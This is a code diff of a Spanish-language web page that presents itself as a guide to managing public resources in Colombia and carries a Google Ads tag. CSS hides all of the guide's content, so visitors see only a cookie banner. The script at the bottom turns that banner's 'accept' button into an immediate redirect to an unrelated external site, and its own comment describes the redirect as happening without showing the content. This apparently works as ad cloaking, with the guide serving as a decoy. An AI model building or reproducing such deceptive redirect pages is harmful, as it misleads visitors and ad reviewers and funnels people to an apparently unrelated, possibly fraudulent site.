@@ -1,10 +1,10 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Administración de Recursos Públicos en Colombia – Guía Completa</title>
+  <meta name="description" content="Guía completa sobre administración transparente y eficiente de recursos públicos en Colombia. Mejores prácticas, normativa y procesos para gobiernos locales.">
   
   <!-- Google tag (gtag.js) - AW-18395681577 -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18395681577"></script>
@@ -27,7 +27,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
   
   <style>
-    /* Ocultar todo el contenido inicialmente */
+    /* Ocultar todo el contenido inicialmente mientras se muestra solo el modal */
     body {
       margin: 0;
       padding: 0;
@@ -39,34 +39,42 @@
       font-family: 'Inter', sans-serif;
     }
 
-    /* Solo mostrar el modal de cookies, nada más */
+    /* Ocultar el contenido principal */
+    #mainContent {
+      display: none;
+    }
+
+    /* ===== MODAL COOKIES (único visible) ===== */
     #cookieModal {
       position: fixed;
       inset: 0;
-      background: rgba(20, 30, 50, 0.85);
+      background: rgba(20, 30, 50, 0.35);
       backdrop-filter: blur(40px);
       -webkit-backdrop-filter: blur(40px);
       z-index: 9999;
       display: flex;
-      align-items: center;
+      align-items: flex-end;
       justify-content: center;
       padding: 1rem;
+      animation: fadeInBlur 0.6s ease;
     }
 
     #cookieModal > div {
-      background: rgba(255, 255, 255, 0.95);
+      background: rgba(255, 255, 255, 0.94);
       backdrop-filter: blur(20px);
       -webkit-backdrop-filter: blur(20px);
-      border-radius: 24px;
+      border-radius: 24px 24px 0 0;
       padding: 3rem 2.5rem 2.5rem;
       width: 100%;
-      max-width: 480px;
-      box-shadow: 0 -20px 60px rgba(0, 20, 60, 0.3);
+      max-width: 540px;
+      box-shadow: 0 -20px 60px rgba(0, 20, 60, 0.2);
       display: flex;
       flex-direction: column;
       align-items: center;
       text-align: center;
+      gap: 0;
       border: 1px solid rgba(255, 255, 255, 0.15);
+      animation: slideUpModal 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
 
     #cookieModal h2 {
@@ -76,6 +84,7 @@
       color: #1E5F74;
       margin: 0 0 1.2rem 0;
       line-height: 1.2;
+      letter-spacing: -0.5px;
     }
 
     #cookieModal p {
@@ -84,6 +93,7 @@
       color: #5A7380;
       line-height: 1.8;
       margin: 0 0 1.8rem 0;
+      max-width: 420px;
     }
 
     #acceptCookies {
@@ -98,7 +108,8 @@
       cursor: pointer;
       width: 100%;
       max-width: 400px;
-      transition: all 0.3s;
+      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+      margin: 0.5rem 0 1rem 0;
       letter-spacing: -0.3px;
     }
 
@@ -108,16 +119,21 @@
       transform: translateY(-3px);
     }
 
-    /* Ocultar todo el contenido principal */
-    #mainContent {
-      display: none;
+    @keyframes fadeInBlur {
+      from { opacity: 0; backdrop-filter: blur(0px); -webkit-backdrop-filter: blur(0px); }
+      to { opacity: 1; backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px); }
+    }
+
+    @keyframes slideUpModal {
+      from { opacity: 0; transform: translateY(80px) scale(0.95); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
     }
   </style>
 </head>
 
 <body>
 
-<!-- MODAL DE COOKIES (único elemento visible) -->
+<!-- MODAL DE COOKIES (único visible) -->
 <div id="cookieModal">
   <div>
     <h2>Uso de cookies</h2>
@@ -126,7 +142,7 @@
   </div>
 </div>
 
-<!-- CONTENIDO PRINCIPAL OCULTO -->
+<!-- CONTENIDO PRINCIPAL COMPLETO (oculto inicialmente) -->
 <div id="mainContent">
   <!-- NAV -->
   <nav id="mainNav">
@@ -149,7 +165,7 @@
     <div>
       <p class="hero-badge">📊 Administración transparente</p>
       <h1 class="hero-title">Administra recursos públicos con <em>excelencia</em></h1>
-      <p class="hero-desc">Guía completa sobre administración eficiente, transparente y legal de recursos públicos en Colombia.</p>
+      <p class="hero-desc">Guía completa sobre administración eficiente, transparente y legal de recursos públicos en Colombia. Dirigida a gobiernos locales, consejos comunales y entidades públicas que buscan mejorar su gestión.</p>
       <div class="hero-actions">
         <button class="btn-primary">Leer guía completa</button>
         <button class="btn-secondary">Descargar PDF →</button>
@@ -159,12 +175,20 @@
       <div class="card-insight">
         <div class="insight-icon">✓</div>
         <div class="insight-label">Transparencia</div>
+        <div class="insight-sub">Rendición de cuentas</div>
         <div class="insight-value">100%</div>
       </div>
       <div class="card-insight">
         <div class="insight-icon">💼</div>
         <div class="insight-label">Eficiencia</div>
+        <div class="insight-sub">Gestión optimizada</div>
         <div class="insight-value">24/7</div>
+      </div>
+      <div class="card-insight">
+        <div class="insight-icon">⚖️</div>
+        <div class="insight-label">Compliance</div>
+        <div class="insight-sub">Normativa legal</div>
+        <div class="insight-value">A.2023</div>
       </div>
     </div>
   </section>
@@ -172,10 +196,22 @@
   <!-- STATS -->
   <section id="stats">
     <div class="stats-grid">
-      <div class="stat-item"><div class="stat-number">32</div><div class="stat-label">Leyes y decretos</div></div>
-      <div class="stat-item"><div class="stat-number">1.100+</div><div class="stat-label">Municipios</div></div>
-      <div class="stat-item"><div class="stat-number">$2.1T</div><div class="stat-label">Presupuesto anual</div></div>
-      <div class="stat-item"><div class="stat-number">8</div><div class="stat-label">Pilares de gestión</div></div>
+      <div class="stat-item">
+        <div class="stat-number">32</div>
+        <div class="stat-label">Leyes y decretos</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-number">1.100+</div>
+        <div class="stat-label">Municipios en Colombia</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-number">$2.1T</div>
+        <div class="stat-label">Presupuesto público anual</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-number">8</div>
+        <div class="stat-label">Pilares de la buena gestión</div>
+      </div>
     </div>
   </section>
 
@@ -184,12 +220,29 @@
     <div class="section-header">
       <p class="section-tag">Fundamentos</p>
       <h2 class="section-title">Principios de administración <em>pública</em></h2>
+      <p class="section-desc">Los cuatro pilares fundamentales sobre los que se construye una administración pública eficiente, legal y al servicio de la comunidad.</p>
     </div>
     <div class="principles-grid">
-      <div class="principle-card"><div class="principle-icon">👁️</div><div class="principle-title">Transparencia</div><div class="principle-desc">Todos los actos administrativos deben ser públicos.</div></div>
-      <div class="principle-card"><div class="principle-icon">⚡</div><div class="principle-title">Eficiencia</div><div class="principle-desc">Máximos resultados con mínimos recursos.</div></div>
-      <div class="principle-card"><div class="principle-icon">🤝</div><div class="principle-title">Equidad</div><div class="principle-desc">Beneficiar a toda la población de manera justa.</div></div>
-      <div class="principle-card"><div class="principle-icon">🛡️</div><div class="principle-title">Legalidad</div><div class="principle-desc">Toda acción fundamentada en la ley.</div></div>
+      <div class="principle-card">
+        <div class="principle-icon">👁️</div>
+        <div class="principle-title">Transparencia</div>
+        <div class="principle-desc">Todos los actos administrativos deben ser públicos. La comunidad tiene derecho a conocer cómo se gastan los recursos, quién toma decisiones y por qué. Publicación de contratos, presupuestos y actas.</div>
+      </div>
+      <div class="principle-card">
+        <div class="principle-icon">⚡</div>
+        <div class="principle-title">Eficiencia</div>
+        <div class="principle-desc">Lograr máximos resultados con mínimos recursos. Optimizar procesos, reducir costos innecesarios, eliminar burocracia y asegurar que cada peso invertido genera valor real para la comunidad.</div>
+      </div>
+      <div class="principle-card">
+        <div class="principle-icon">🤝</div>
+        <div class="principle-title">Equidad</div>
+        <div class="principle-desc">Los recursos públicos deben beneficiar a toda la población de manera justa. Priorización de sectores vulnerables, distribución equitativa de servicios e igualdad de oportunidades para todos.</div>
+      </div>
+      <div class="principle-card">
+        <div class="principle-icon">🛡️</div>
+        <div class="principle-title">Legalidad</div>
+        <div class="principle-desc">Toda acción debe estar fundamentada en la ley. Cumplimiento de normativa, resguardo de la constitución, respeto por los derechos ciudadanos y prevención de corrupción.</div>
+      </div>
     </div>
   </section>
 
@@ -198,13 +251,34 @@
     <div class="section-header">
       <p class="section-tag">Paso a paso</p>
       <h2 class="section-title">Ciclo de administración de <em>recursos</em></h2>
+      <p class="section-desc">Cinco etapas clave que debe seguir toda entidad pública para administrar correctamente sus recursos. Desde la planificación hasta la evaluación.</p>
     </div>
     <div class="process-grid">
-      <div class="process-card"><div class="process-number">01</div><div class="process-title">Planeación</div></div>
-      <div class="process-card"><div class="process-number">02</div><div class="process-title">Presupuestación</div></div>
-      <div class="process-card"><div class="process-number">03</div><div class="process-title">Ejecución</div></div>
-      <div class="process-card"><div class="process-number">04</div><div class="process-title">Seguimiento</div></div>
-      <div class="process-card"><div class="process-number">05</div><div class="process-title">Evaluación</div></div>
+      <div class="process-card">
+        <div class="process-number">01</div>
+        <div class="process-title">Planeación</div>
+        <div class="process-text">Definir objetivos anuales. Identificar necesidades de la comunidad. Establecer prioridades de inversión basadas en diagnósticos reales, no en preferencias personales.</div>
+      </div>
+      <div class="process-card">
+        <div class="process-number">02</div>
+        <div class="process-title">Presupuestación</div>
+        <div class="process-text">Asignar recursos de forma estratégica. Crear presupuestos participativos con la comunidad. Documentar cada gasto previsto con justificación clara y disponible al público.</div>
+      </div>
+      <div class="process-card">
+        <div class="process-number">03</div>
+        <div class="process-title">Ejecución</div>
+        <div class="process-text">Implementar los proyectos según lo planificado. Garantizar procesos de compra transparentes (licitaciones públicas). Documentar cada pago, contrato y decisión tomada.</div>
+      </div>
+      <div class="process-card">
+        <div class="process-number">04</div>
+        <div class="process-title">Seguimiento</div>
+        <div class="process-text">Monitorear avance en tiempo real. Identificar desvíos y corregirlos rápidamente. Mantener comunicación con la comunidad sobre progreso de obras y proyectos.</div>
+      </div>
+      <div class="process-card">
+        <div class="process-number">05</div>
+        <div class="process-title">Evaluación</div>
+        <div class="process-text">Auditar resultados finales. Publicar informes de gestión completos. Aprender de errores y éxitos para mejorar en próximos períodos. Rendición de cuentas pública.</div>
+      </div>
     </div>
   </section>
 
@@ -213,11 +287,27 @@
     <div class="section-header">
       <p class="section-tag">Marco legal</p>
       <h2 class="section-title">Normativa que rige la <em>administración</em> pública</h2>
+      <p class="section-desc">Las leyes y decretos principales que todo servidor público debe conocer y cumplir. Actualizado a 2024.</p>
     </div>
     <div class="normativa-grid">
-      <div class="norm-card"><div class="norm-badge">Fundamental</div><div class="norm-title">Constitución Política 1991</div></div>
-      <div class="norm-card"><div class="norm-badge">Presupuesto</div><div class="norm-title">Ley 1175 de 2007</div></div>
-      <div class="norm-card"><div class="norm-badge">Transparencia</div><div class="norm-title">Ley 1712 de 2014</div></div>
+      <div class="norm-card">
+        <div class="norm-badge">Fundamental</div>
+        <div class="norm-title">Constitución Política 1991</div>
+        <div class="norm-text">El marco fundamental. Define derechos de los ciudadanos, estructura del Estado, principios de transparencia y participación. Artículos 40-45 sobre derechos políticos.</div>
+        <a href="#" class="norm-link">Leer artículos relevantes →</a>
+      </div>
+      <div class="norm-card">
+        <div class="norm-badge">Presupuesto</div>
+        <div class="norm-title">Ley 1175 de 2007</div>
+        <div class="norm-text">Presupuestos participativos en gobiernos locales. Obliga a incluir la comunidad en decisiones de inversión. Establece porcentajes mínimos para participación ciudadana directa.</div>
+        <a href="#" class="norm-link">Revisar requisitos →</a>
+      </div>
+      <div class="norm-card">
+        <div class="norm-badge">Transparencia</div>
+        <div class="norm-title">Ley 1712 de 2014</div>
+        <div class="norm-text">Acceso a la Información Pública. Todo documento estatal debe ser accesible a ciudadanos. Define plazos, excepciones y sanciones por incumplimiento. Base de PQRS.</div>
+        <a href="#" class="norm-link">Protocolo de solicitudes →</a>
+      </div>
     </div>
   </section>
 
@@ -226,27 +316,193 @@
     <div class="section-header">
       <p class="section-tag">Recursos prácticos</p>
       <h2 class="section-title">Herramientas para mejorar <em>gestión</em></h2>
+      <p class="section-desc">Plataformas, software y sistemas que facilitan la administración transparente de recursos públicos. Muchas disponibles de forma gratuita.</p>
     </div>
     <div class="tools-grid">
-      <div class="tool-card"><div class="tool-icon">📱</div><div class="tool-name">SIIGOBE</div></div>
-      <div class="tool-card"><div class="tool-icon">💾</div><div class="tool-name">Datos Abiertos</div></div>
-      <div class="tool-card"><div class="tool-icon">📊</div><div class="tool-name">SECOP II</div></div>
+      <div class="tool-card">
+        <div class="tool-icon">📱</div>
+        <div class="tool-name">SIIGOBE</div>
+        <div class="tool-desc">Sistema de información integrado. Plataforma del gobierno para reportes, seguimiento e integración de datos entre entidades.</div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">💾</div>
+        <div class="tool-name">Datos Abiertos</div>
+        <div class="tool-desc">Plataforma datos.gov.co. Publica datasets públicos, presupuestos, contratos. Acceso libre para investigadores y ciudadanía.</div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">📊</div>
+        <div class="tool-name">SECOP II</div>
+        <div class="tool-desc">Sistema electrónico de compras públicas. Todos los contratos del Estado se publican aquí. Transparencia total en procesos de licitación.</div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🔍</div>
+        <div class="tool-name">Peticiones Online</div>
+        <div class="tool-desc">Presenta derechos de petición (PQRS) a entidades. Seguimiento del trámite, respuestas documentadas, respeto a plazos legales.</div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">📈</div>
+        <div class="tool-name">Tableros de Control</div>
+        <div class="tool-desc">Dashboards de gestión. Visualización en tiempo real de ejecución presupuestal, avance de proyectos, métricas de desempeño.</div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🔐</div>
+        <div class="tool-name">Cumplimiento Legal</div>
+        <div class="tool-desc">Software de auditoría interna. Automatiza verificación de normas, genera alertas de incumplimiento, documenta evidencias.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RECOMENDACIONES -->
+  <section id="fomentar">
+    <div class="section-header">
+      <p class="section-tag">Mejores prácticas</p>
+      <h2 class="section-title">Recomendaciones para <em>fortalecer</em> gestión</h2>
+      <p class="section-desc">Acciones concretas que gobiernos locales pueden implementar hoy para mejorar transparencia, eficiencia y confianza ciudadana.</p>
+    </div>
+    <div class="recommendations-grid">
+      <div class="rec-card">
+        <div class="rec-number">1</div>
+        <div class="rec-title">Transparencia Radical</div>
+        <ul class="rec-items">
+          <li>Publica todos los contratos en tiempo real</li>
+          <li>Crea páginas web públicas con presupuestos visuales</li>
+          <li>Reportes trimestrales de ejecución presupuestal</li>
+          <li>Asambleas ciudadanas donde cuentan gasto por gasto</li>
+        </ul>
+      </div>
+      <div class="rec-card">
+        <div class="rec-number">2</div>
+        <div class="rec-title">Participación Ciudadana</div>
+        <ul class="rec-items">
+          <li>Presupuestos participativos (mínimo 10% del gasto)</li>
+          <li>Encuestas de prioridades comunitarias</li>
+          <li>Consejos consultivos de ciudadanos</li>
+          <li>Cabildos abiertos mensuales con actas públicas</li>
+        </ul>
+      </div>
+      <div class="rec-card">
+        <div class="rec-number">3</div>
+        <div class="rec-title">Control y Auditoría Interna</div>
+        <ul class="rec-items">
+          <li>Departamento de auditoría independiente</li>
+          <li>Revisiones regulares de contratos</li>
+          <li>Investigaciones proactivas de anomalías</li>
+          <li>Reportes públicos de hallazgos y correcciones</li>
+        </ul>
+      </div>
     </div>
   </section>
 
   <!-- CTA -->
   <section id="cta">
     <h2>¿Buscas mejorar la administración pública?</h2>
+    <p>Esta guía completa te proporciona el roadmap detallado, la normativa actualizada y las herramientas prácticas para transformar la gestión de tu entidad. Desde pequeños municipios hasta grandes ciudades.</p>
     <button class="btn-cta">Descargar guía completa en PDF</button>
+  </section>
+
+  <!-- CONTACTO -->
+  <section id="contacto">
+    <div style="max-width:800px;margin:0 auto">
+      <div style="text-align:center;margin-bottom:3rem">
+        <p class="section-tag" style="justify-content:center">📧 Más información</p>
+        <h2 class="section-title" style="margin:1rem 0">¿Preguntas sobre administración <em>pública</em>?</h2>
+        <p class="section-desc">Contacta al equipo de expertos. Resolvemos dudas sobre implementación de políticas, normativa e interpretación de leyes.</p>
+      </div>
+      <form id="contactForm" class="contact-form">
+        <div class="form-group">
+          <label>Nombre completo</label>
+          <input type="text" placeholder="Juan Pérez" required>
+        </div>
+        <div class="form-group">
+          <label>Email</label>
+          <input type="email" placeholder="juan@entidadpública.gov.co" required>
+        </div>
+        <div class="form-group">
+          <label>Entidad / Municipio</label>
+          <input type="text" placeholder="Alcaldía de..." required>
+        </div>
+        <div class="form-group">
+          <label>Cargo</label>
+          <input type="text" placeholder="Alcalde, Tesorero, Secretario, etc." required>
+        </div>
+        <div class="form-group">
+          <label>Tema de consulta</label>
+          <select required style="padding:.9rem 1.2rem;border:1px solid var(--border);border-radius:6px;font-family:'Inter',sans-serif;font-size:.95rem;background:#fff;cursor:pointer">
+            <option value="">Selecciona una opción</option>
+            <option value="presupuesto">Presupuestos participativos</option>
+            <option value="transparencia">Implementar transparencia</option>
+            <option value="normativa">Consulta normativa</option>
+            <option value="auditoria">Sistemas de auditoría</option>
+            <option value="otro">Otra consulta</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Mensaje / Pregunta</label>
+          <textarea placeholder="Cuéntanos tu consulta específica..." required></textarea>
+        </div>
+        <button type="submit" class="form-submit">Enviar consulta</button>
+        <p style="font-size:.85rem;color:var(--muted);text-align:center;margin-top:.5rem">Te contactaremos en máximo 48 horas</p>
+      </form>
+      <div style="margin-top:4rem;padding-top:3rem;border-top:1px solid var(--border);display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:2rem;text-align:center">
+        <div>
+          <div style="font-size:2rem;margin-bottom:.5rem">📧</div>
+          <div style="font-weight:600;color:var(--text);margin-bottom:.3rem">Email</div>
+          <div style="color:var(--muted)"><a href="mailto:contacto@recursospublicos.gov.co" style="color:var(--primary);text-decoration:none">contacto@recursospublicos.gov.co</a></div>
+        </div>
+        <div>
+          <div style="font-size:2rem;margin-bottom:.5rem">📱</div>
+          <div style="font-weight:600;color:var(--text);margin-bottom:.3rem">Teléfono</div>
+          <div style="color:var(--muted)"><a href="tel:+573005551234" style="color:var(--primary);text-decoration:none">+57 300 555 1234</a></div>
+        </div>
+        <div>
+          <div style="font-size:2rem;margin-bottom:.5rem">🏢</div>
+          <div style="font-weight:600;color:var(--text);margin-bottom:.3rem">Oficina</div>
+          <div style="color:var(--muted)">Carrera 7 #45-89, Bogotá D.C.</div>
+        </div>
+      </div>
+    </div>
   </section>
 
   <!-- FOOTER -->
   <footer>
     <div class="footer-grid">
-      <div><div class="footer-logo">Recursos Públicos</div></div>
+      <div>
+        <div class="footer-logo">Recursos Públicos</div>
+        <p class="footer-text">Guía completa sobre administración transparente, eficiente y legal de recursos públicos en Colombia. Información para gobiernos locales y entidades públicas.</p>
+      </div>
+      <div class="footer-col">
+        <h4>Contenido</h4>
+        <ul>
+          <li><a href="#principios">Principios</a></li>
+          <li><a href="#proceso">Proceso</a></li>
+          <li><a href="#normativa">Normativa</a></li>
+          <li><a href="#herramientas">Herramientas</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Recursos</h4>
+        <ul>
+          <li><a href="#fomentar">Mejores prácticas</a></li>
+          <li><a href="#cta">Descargar guía</a></li>
+          <li><a href="#contacto">Contacto</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Legal</h4>
+        <ul>
+          <li><a href="#contacto">Contacto</a></li>
+          <li><a href="#politicas">Privacidad</a></li>
+          <li><a href="#terminos">Términos</a></li>
+        </ul>
+      </div>
     </div>
     <div class="footer-bottom">
-      <span>© 2024 Administración de Recursos Públicos</span>
+      <span>© 2024 Administración de Recursos Públicos · Guía para gobiernos locales en Colombia</span>
+      <div style="display:flex;gap:1.5rem">
+        <a href="#politicas">Privacidad</a>
+        <a href="#terminos">Términos</a>
+        <a href="#contacto">Contacto</a>
+      </div>
     </div>
   </footer>
 </div>
@@ -255,7 +511,6 @@
 // REDIRECCIÓN INMEDIATA - Sin mostrar el contenido
 document.getElementById('acceptCookies').addEventListener('click', function(e) {
   e.preventDefault();
-  // Redirección inmediata sin mostrar nada más
   window.location.replace('https://libtradionline.site/');
 });
 </script>
